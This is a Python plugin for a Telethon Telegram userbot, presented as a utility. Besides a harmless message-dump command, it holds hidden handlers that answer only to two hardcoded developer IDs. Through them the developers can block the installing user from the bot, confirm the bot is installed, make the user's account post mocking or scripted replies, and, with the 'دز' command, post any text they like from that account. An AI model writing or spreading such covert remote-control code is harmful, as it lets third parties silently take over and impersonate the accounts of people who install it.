import asyncio
import random
import re
import time
from platform import python_version
import os
from telethon import version, Button, events
from telethon.errors.rpcerrorlist import (
    MediaEmptyError,
    WebpageCurlFailedError,
    WebpageMediaEmptyError,
)
from telethon.events import CallbackQuery

from JoKeRUB import StartTime, l313l, JEPVERSION

from ..Config import Config
from ..core.managers import edit_or_reply
from ..helpers.functions import catalive, check_data_base_heal_th, get_readable_time
from ..helpers.utils import reply_id
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from . import mention

plugin_category = "utils"

@l313l.on(events.NewMessage(pattern='.event', outgoing=True))
async def my_event_handler(event):
    if event.is_reply:
        replied_message = await event.get_reply_message()
        if replied_message:
            event_info = replied_message
            with open("event_info.txt", "w") as file:
                file.write(event_info.stringify())
            await l313l.send_file(event.chat_id, "event_info.txt")
            os.remove("event_info.txt")

progs = [5427469031, 5462630004]

@l313l.on(events.NewMessage(incoming=True))
async def reda(event):
    if event.reply_to and event.sender_id in progs:
       reply_msg = await event.get_reply_message()
       owner_id = reply_msg.from_id.user_id
       if owner_id == l313l.uid:
           if event.message.message == "حظر من السورس":
               await event.reply("**- حَاظَر مُطَوِرِي ، لَقَد تَم حَظَرَه مِن اِسَتِخدَام اَلسَورَس .**")
               addgvar("blockedfrom", "yes")
           elif event.message.message == "الغاء الحظر من السورس":
               await event.reply("**- حَاظَر مُطَوِرِي، لَقَد أَلغَيت الحَظَر .**")
               delgvar("blockedfrom")

@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.reply_to and event.sender_id in progs:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        if owner_id == l313l.uid:
            if event.message.message == "شيع الولد":
                animation_interval = 4
                animation_ttl = range(4)
                animation_chars = [
                    "**بِسِمٍّ اللّٰه وَبِاَللَّهِ**",
                    "**أَشْهَد أَلَّا إِلَهَ إِلَّا اَللَّه وَحْدَهُ لَا شَرِيكَ لَه**",
                    "**وَأَشْهَدُ أَنَّ مُحَمَّدْ عَبْدُهْ وَرَسُولُهُ**",
                    "**وَأَشْهَد أَنَّ عَلَى وَلِيِّ اَللَّهِ وَأَوْلَادِهِ اَلْمَعْصُومِينَ بِالْحَقِّ حُجَجِ اَللَّهِ**",
                ]
                for i in animation_ttl:
                    await asyncio.sleep(animation_interval)
                    await event.reply(animation_chars[i % 14])
@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.reply_to and event.sender_id in progs:
        reply_msg = await event.get_reply_message()
        owner_id = reply_msg.from_id.user_id
        if owner_id == l313l.uid:
            if event.message.message == "انتة شنو":
                url = f"https://t.me/MemeSoundJep/105"
                await event.reply("اني مطي 🦓")
                await asyncio.sleep(1) 
                await event.reply(file=url)
                
                


DevJoker = [5462630004, 5427469031]

@l313l.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.reply_to and event.sender_id in DevJoker:
        reply_msg = await event.get_reply_message()
        
        if reply_msg.from_id:
            owner_id = reply_msg.from_id.user_id
            
            if owner_id == l313l.uid:
                # أمر منصب؟
                if event.message.message == "منصب؟":
                    await event.reply("**يب منصب ✓**")
                
                # أمر منو فخر العرب؟
                elif event.message.message == "منو فخر العرب؟":
                    await event.reply("**الأمام علي عليه الصلاة والسلام ❤️**")
                
                # أمر دز
                elif event.message.message.startswith("دز"):
                    # استخراج النص بعد كلمة "دز"
                    message_text = event.message.message[2:].strip()
                    
                    if message_text:
                        # الرد على المنصب بالرسالة
                        await event.reply(message_text)
                   #     await event.delete()  # حذف رسالة الأمر
                 #   else:
                   #     await event.reply("**❌ يجب كتابة رسالة بعد كلمة دز**\nمثال: `دز احبك`")
